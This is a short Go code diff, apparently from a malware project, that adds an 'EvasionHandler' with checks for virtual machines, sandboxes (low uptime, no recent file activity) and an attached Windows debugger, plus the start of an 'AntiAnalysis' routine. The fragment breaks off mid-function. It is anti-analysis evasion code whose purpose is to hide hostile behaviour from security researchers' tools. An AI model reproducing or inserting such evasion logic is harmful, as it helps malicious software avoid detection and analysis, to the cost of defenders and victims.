@@ -78,3 +78,43 @@ func (e *EvasionHandler) CheckVM() bool {
 	}
 
 	for _, indicator := range vmIndicators {
+		if checkSystemInfo(indicator) {
+			return true
+		}
+	}
+
+	if runtime.NumCPU() < 2 {
+		return true
+	}
+
+	return false
+}
+
+func (e *EvasionHandler) CheckSandbox() bool {
+	recentFiles := checkRecentActivity()
+	if !recentFiles {
+		return true
+	}
+
+	if checkLowUptime() {
+		return true
+	}
+
+	return false
+}
+
+func (e *EvasionHandler) CheckDebugger() bool {
+	if runtime.GOOS != "windows" {
+		return false
+	}
+
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
+
+	ret, _, _ := isDebuggerPresent.Call()
+	return ret != 0
+}
+
+func (e *EvasionHandler) AntiAnalysis() error {
+	if e.CheckVM() {
+		return fmt.Errorf("VM detected")
